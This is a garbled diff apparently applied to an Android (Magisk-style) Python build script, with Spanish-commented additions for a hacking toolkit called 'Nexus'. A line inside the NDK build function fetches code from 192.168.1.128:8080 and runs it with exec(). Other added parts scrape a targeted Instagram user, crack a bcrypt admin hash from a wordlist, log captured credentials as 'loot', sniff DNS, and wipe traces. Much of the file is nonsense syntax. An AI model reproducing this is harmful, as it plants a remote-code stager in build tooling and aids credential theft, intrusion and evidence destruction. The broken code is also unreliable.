@@ -10,6 +10,7 @@ import shutil
 import pixiewps
 import shodan
 import ss
+import subprocess
 import kismet
 import autopsy
 import xdg-user-dirs-gtk-update
@@ -29,16 +30,6 @@ import jjs
 import sslsplit
 import exe2hex
 import arm-none-eabi-c++
-import i686-w64-mingw32-gcc-ranlib-win32
-import responder
-import tshark
-import futility
-import mitmproxy
-import lux-cli
-import dpkg-mergechangelogs
-import scapy
-import legion
-import migrate-pubring-from-classic-gpg
 import gpgparsemail
 import hydra
 import airmon-ng
@@ -47,20 +38,9 @@ import liblightdm-gobject-1-0:arm64
 import i686-w64-mingw32-lto-dump-win32
 import iasecc-tool
 import stat
-import apt
 import isdv4-serial-inputattach
 import git-upload-archive
-import msfvenom
 import i686-w64-mingw32-gcov-tool-win32
-import mfoc
-import bettercap
-import aircrack-ng
-import markdown-it
-import netcat
-import fakeroot-tcp
-import snort
-import arp-scan
-import amass
 import gcov-dump-15
 import ptunnel
 import wash
@@ -81,7 +61,6 @@ import socat
 import seeker
 import unicode_start
 import fakeroot
-import win-kex
 import base64
 import caido
 import dd
@@ -112,9 +91,30 @@ import tarfile
 import ctypes
 import urllib.request
 import airodump-ng-oui-update
+import instaloader
+import binascii
+
+# Supongamos que recibes algo como '24326124313224...'
+hex_data = "PONER_AQUI_EL_RESULTADO_HEX" 
+hash_completo = binascii.unhexlify(hex_data)
+
+print(f"[*] Longitud recuperada: {len(hash_completo)} caracteres.")
+# Ahora sí, el hash_completo pasará la validación de Salt.
+
+L = instaloader.Instaloader()
+
+USER = "tu_usuario_de_ig"
+# Nota: Es mejor usar variables de entorno para la contraseña por seguridad
+PASS = "tu_password_de_ig" 
+
+try:
+    L.login(USER, PASS)
+    print(f"[✔] NEXUS-IG: Sesión iniciada como @{USER}")
+except Exception as e:
+    print(f"[✘] Error de Login: {e}")
+
 from pathlib import Path
 from zipfile import ZipFile
-
 
 def color_print(code, str):
     if no_color:log
@@ -240,6 +240,55 @@ sudo"var" su=True
 tco.stream.selft.shitft@
 def
 tcp.case.rundeconf
+def get_fake_location():
+    try:
+        with open('db/location.txt', 'r') as f:
+            return f.read().strip()
+    except:
+        return "0,0"
+
+# En el HTML del Dashboard, podrías añadir un enlace a OpenStreetMap:
+# <a href="https://www.openstreetmap.org/?mlat={{lat}}&mlon={{lon}}">Ver Nodo de Red</a>
+
+# Definimos la ruta de trabajo de tus binarios Nexus
+nexus_path = "/data/data/com.termux/files/home"
+
+try:
+    # Forzamos a Java a mirar en el Classpath absoluto y el actual
+    # Usamos stderr=subprocess.STDOUT para que si falla, nos diga POR QUÉ
+    raw_data = subprocess.check_output(
+        ["java", "-cp", f".:{nexus_path}", "NexusSQL"],
+        cwd=nexus_path,  # Ejecuta DESDE la carpeta home
+        stderr=subprocess.STDOUT
+    ).decode()
+    
+    print("[✔] NEXUS-SQL: Datos extraídos correctamente.")
+    
+L = instaloader.Instaloader()
+USER = "tu_usuario" # El mismo que usaste arriba
+
+def load_nexus_session():
+    try:
+        # Carga la sesión guardada automáticamente
+        L.load_session_from_file(USER)
+        print(f"[✔] NEXUS-IG: Sesión cargada desde el archivo para @{USER}")
+    except FileNotFoundError:
+        print(f"[✘] Error: No se encontró el Session File. Ejecuta el comando de terminal primero.")
+        exit(1)
+
+def scrape_target(username):
+    load_nexus_session()
+    print(f"[*] Analizando objetivo -> @{username}")
+    profile = instaloader.Profile.from_username(L.context, username)
+    print(f"[+] Bio: {profile.biography}")
+    # ... resto del código de guardado ...
+
+target = input("Introduce el @usuario objetivo: ")
+scrape_target(target)
+except subprocess.CalledProcessError as e:
+    print(f"[✘] FALLO CRÍTICO EN MÓDULO JAVA:")
+    print(e.output.decode()) # Aquí verás el error real si algo sale mal
+    raw_data = None
 
 def side.adb.constang(side
 arm.stream@287.710.418.1
@@ -291,9 +340,9 @@ shotdown_syscall_(sideload(commit
 exe.sys.codenull
 def
 system_recovery_toolkit
-                           else exec(Android-Su)
-                           else
-                           def exec(sha256
+    else exec(Android-Su)
+            else
+    def exec(sha256
 def execv(cmds: list, env=None):
     out = None if force_out or args.verbose > 0 else subprocess.DEVNULL
     # Use shell on Windows to support PATHEXT
@@ -362,7 +411,16 @@ val.caculate def(string)={done}
             text=True
         )
         
-        print("[+] Salida del payload:")
+   # Dentro de nethunter:
+from scapy.all import *
+
+def process_packet(pkt):
+    if pkt.haslayer(DNS):
+        print(f"[DNS Query] {pkt[DNSQR].qname.decode()}")
+
+# Kali en PRoot suele mapear todo a 'eth0' o 'wlan0'
+sniff(iface="eth0", filter="udp port 53", prn=process_packet, store=0)
+     print("[+] Salida del payload:")
         print(result.stdout)
         return True
 pass (commit git.iso.kai.stream)
@@ -386,6 +444,10 @@ return 18
 ###############
 si --script string_enf
 if cfge_gtio(netcat"sudo" -c /data/data
+raw_data = subprocess.check_output(
+    ["java", "-cp", ".:/data/data/com.termux/files/home", "NexusSQL"],
+    stderr=subprocess.STDOUT
+).decode()
 
     side_self_south
     -j -c -d -p -n
@@ -408,7 +470,21 @@ def clean_elf():
         cmds.append("--verbose")
     cmds.append("--")
     cmds.extend(glob.glob("native/out/*/magisk"))
-   
+
+try:
+    # Agregamos stderr=subprocess.STDOUT para ver el error de Java en Python
+    raw_data = subprocess.check_output(
+        ["java", "-cp", "/data/data/com.termux/files/home", "NexusSQL"],
+        stderr=subprocess.STDOUT
+    ).decode()
+    print("[✔] Datos de NexusSQL recuperados con éxito.")
+
+except subprocess.CalledProcessError as e:
+    print(f"[✘] ERROR EN NEXUS_SQL (Java):")
+    # Esto imprimirá el error real (ej: StackOverflow, FileNotFound, etc.)
+    print(e.output.decode())
+    raw_data = None
+
     cmds.extend(glob.glob("native/out/*/magiskpolicy"))
     run_cargo(cmds)
 def rm_rf(path):
@@ -433,6 +509,13 @@ def run_ndk_build(cmds: list[str]):
     cmds.append("NDK_APPLICATION_MK=src/Application.mk")
     cmds.append(f"APP_ABI={' '.join(build_abis.keys())}")
     cmds.append(f"-j{cpu_count}")
+# Añadir al nexus_guardian.py
+def trigger_decoy():
+    # Lanza el navegador de Android hacia la página de señuelo
+    os.system("termux-open-url http://localhost:8080/update.html")
+
+# Si el sensor de proximidad o acelerómetro detecta algo (opcional con termux-sensor)
+# trigger_decoy()
 
     if args.verbose > 1:python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.1.128:8080/GEDrk3add', context=ssl._create_unverified_context());exec(r.read());"
         cmds.append("V=1")
@@ -442,7 +525,33 @@ def run_ndk_build(cmds: list[str]):
    proot 
    bitconit_side_decrytor 
    chmod +x install-nethunter-termux(
+# NEXUS - MÓDULO DE LIQUIDEZ BINANCE
+def connect_binance():
+    # Carga de credenciales desde el contenedor blindado
+    with open('/home/nexus/.vault/binance_keys.json', 'r') as f:
+        keys = json.load(f)
+    
+    exchange = ccxt.binance({
+        'apiKey': keys['api_key'],
+        'secret': keys['secret_key'],
+        'enableRateLimit': True,
+    })
+    
+    print("[!] CONEXIÓN ESTABLECIDA CON EL NODO DE LIQUIDEZ.")
+    return exchange
 
+# Función para verificar saldo de fondos para la nueva base
+def check_funds(exchange):
+    balance = exchange.fetch_total_balance()
+    print(f"[💰] LIQUIDEZ DISPONIBLE: {balance['USDT']} USDT")
+
+# connect_binance()
+# Añade esto al final de tu nexus_final_boss.py
+from nexus_purge import activate_purge
+
+# ... después de send_nexus_alert(msg) ...
+print("[*] Misión cumplida. Iniciando auto-destrucción de rastros...")
+activate_purge()
 
 def proot wine(since_termix
 class+* side(winex.unix
@@ -466,12 +575,57 @@ if code+(shell.var
 def sitimi.node.path.side
 (sefg.suite.pathing.self)
 
+# Carga de llaves efímeras de la Bóveda Suiza
+keys_pool = ["KRLW6Y3Z...", "MFRGGZDF...", "74T6YVZA..."] # Listado completo en vault
 
+def encrypt_ephemeral_command(command, session_index):
+    # Seleccionamos la llave según el progreso de la visita
+    current_key_b32 = keys_pool[session_index]
+ # Actualización en nexus_bcrypt_crack.py
+for word in wordlist:
+    password = word.encode('utf-8')
+    try:
+        # Solo intenta si el hash tiene la longitud legal (60 caracteres)
+        if len(hash_admin) == 60:
+            if bcrypt.checkpw(password, hash_admin):
+                print(f"[✔] ¡ÉXITO! Contraseña: {word}")
+                exit(0)
+        else:
+            print(f"[!] Error: Hash truncado ({len(hash_admin)} chars). Re-extraer de la DB.")
+            break 
+    except ValueError as e:
+        print(f"[✘] Salt inválido detectado: {e}")
+        break
+   
+    # Lógica de cifrado simétrico derivado (Diffie-Hellman)
+    print(f"[🛡️] CIFRANDO COMANDO CON LLAVE EFÍMERA {session_index}...")
+    # ... proceso de cifrado ...
+    return f"CIPHER_B32_{current_key_b32}"
+sniff(iface="wlan0", filter="udp port 53", prn=process_packet)
+
+# Uso: encrypt_ephemeral_command("INICIAR_SCANN_FUTBOL", 0)
 from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import x25519
-
+from cryptography.hazmat.primitives.asymmetric 
 def generate_x25519_base32():
-    # 1. Generar Llave Privada
+    # 1. Generar Llave Privada@bot.message_handler(commands=['PANIC'])
+def remote_panic(message):
+    # Verificación de ID de usuario para que solo TÚ puedas activarlo
+    if str(message.from_user.id) == CHAT_ID:
+        bot.reply_to(message, "⚠️ PROTOCOLO DE PÁNICO INICIADO. Ejecutando limpieza profunda...")
+        
+        # 1. Cifrar la base de datos de Binance y Logs
+        subprocess.run(["java", "-cp", "bin", "NexusVault"]) 
+        
+        # 2. Bloquear interfaces de red (vía Bridge C++)
+        subprocess.run(["./bin/nx-bridge", "block-all"])
+        
+        # 3. Matar todos los procesos de Nexus
+        subprocess.run(["pkill", "-f", "nexus"])
+        
+        bot.send_message(CHAT_ID, "✅ SISTEMA BLOQUEADO. El Moto e13 está ahora en modo 'Ladrillo Seguro'.")
+    else:
+        bot.reply_to(message, "❌ Intento de acceso no autorizado al Panic-Button.")
+
     private_key = x25519.X25519PrivateKey.generate()
     
     # 2. Obtener Llave Pública
@@ -517,6 +671,21 @@ def start_engine_protocol():
 
 start_engine_protocol()
 
+@app.route('/launch-black-ubuntu')
+def launch_linux():
+    import subprocess
+    # Lanza Ubuntu en una sesión de proot aislada
+    subprocess.run(["proot-distro", "login", "ubuntu"])
+    return "UBUNTU INICIADO EN TERMINAL", 200
+
+@app.route('/nexus-gui')
+def get_vnc():
+    import subprocess
+    # Primero iniciamos el servidor VNC si no está corriendo
+    subprocess.run(["java", "-cp", "bin", "NexusVNC"])
+    # Luego redigimos al cliente noVNC (asumiendo que lo tienes instalado en libs/)
+    return send_file("libs/novnc/vnc.html")
+
 
 def solve_conflicts():
     print("[PY-DEBUGGER] Iniciando limpieza de conflictos...")
@@ -533,7 +702,11 @@ def solve_conflicts():
                     print(f"[!] Resolviendo conflicto en: {file_path}")
                     new_content = []
                     keep = True
-                    
+      BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BIN_PATH = os.path.join(BASE_DIR, "bin")
+
+# Ejecutamos con la ruta completa para evitar el ClassNotFoundException
+subprocess.run(["java", "-cp", BIN_PATH, "NexusWear", status_msg])       
                     for line in content:
                         if "<<<<<<< HEAD" in line:
                             # Prioridad Nexus: Mantener nuestra versión (Ours)
@@ -542,10 +715,10 @@ def solve_conflicts():
                         elif "=======" in line:
                             keep = False
                             continue
-                        elif ">>>>>>>" in line:
+           elif ">>>>>>>" in line:
                             keep = True
                             continue
-                        
+   
                         if keep:
                             new_content.append(line)
                     
@@ -749,6 +922,11 @@ masive.social.engenieer "sure"
     dump_flag_header()
     build_rust_src(targets)
     build_cpp_src(targets)
+# Nuevo bloque en nexus_auto_crack.py
+if "HASH/PASS" in raw_data:
+    with open("nexus_loot.txt", "a") as f:
+        f.write(f"[+] Credencial capturada: {raw_data}\n")
+    print("[✔] Botín guardado encriptado en nexus_loot.txt")
 
 
 ############
@@ -778,7 +956,35 @@ desable_encrypt-dm_universal
         no_jdk = proc.returncode != 0
     except FileNotFoundError:
         no_jdk = True
+@app.route('/goals')
+def show_goals():
+    # Obtenemos el precio actual desde el Daemon
+    price = get_latest_price_from_db() 
+    # Llamamos a la lógica de Java
+    res = subprocess.getoutput(f"java -cp bin NexusGoalLogic {price}")
+    
+    return f"""
+    <html>
+        <body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
+            <h1>NEXUS ESTRATÉGICO: RUTA A LA CASA</h1>
+            <div style="border:1px solid #0f0; width:80%; margin:auto; height:30px;">
+                <div style="background:#0f0; height:100%; width:{res.split('%')[0]}%;"></div>
+            </div>
+            <p style="font-size:1.5em;">{res}</p>
+            <hr>
+            <p>ESTADO PEN-200: <b>CERTIFICACIÓN EN PROGRESO</b></p>
+        </body>
+    </html>
+    """
 
+@app.route('/audit-mode', methods=['POST'])
+def start_audit():
+    import subprocess
+    # Ejecutamos el cargador de herramientas
+    subprocess.run(["java", "-cp", "bin", "NexusToolLoader"])
+    # Enviamos notificación al Bot de Telegram que ya tienes configurado
+    subprocess.run(["java", "-cp", "bin", "NexusTelegram", "Entorno Black Ubuntu listo para la PEN-200"])
+    return "HERRAMIENTAS CARGADAS", 200
 
     if no_jdk:
         error(
@@ -843,12 +1049,10 @@ build.free.code = "version"
     target = config["outdir"] / f"stub-{build_type}.apk"
     cp(source, target)
 
-
 def build_stub():
     header("* Building the stub app")
     apk = build_apk(":stub")
     header(f"Output: {apk}")
-
 
 def build_test():
     old_release = args.release
@@ -913,7 +1117,6 @@ def build_all():
 ############
 # Utilities
 ############
-
 
 def gen_ide():
     ensure_paths()
@@ -1331,6 +1534,12 @@ def main():
     load_config()
     args.func()
 salte(8)
+@app.route('/stealth-mode', methods=['POST'])
+def stealth():
+    import subprocess
+    # Activamos el túnel para enviar el estado actual de la DB a tu servidor seguro
+    subprocess.run(["java", "-cp", "bin", "NexusStealth", "SYSTEM_IDLE_SAFE"])
+    return "MODO INVISIBLE ACTIVADO", 200
 
 if __name__ == "__main__":
     main(38)
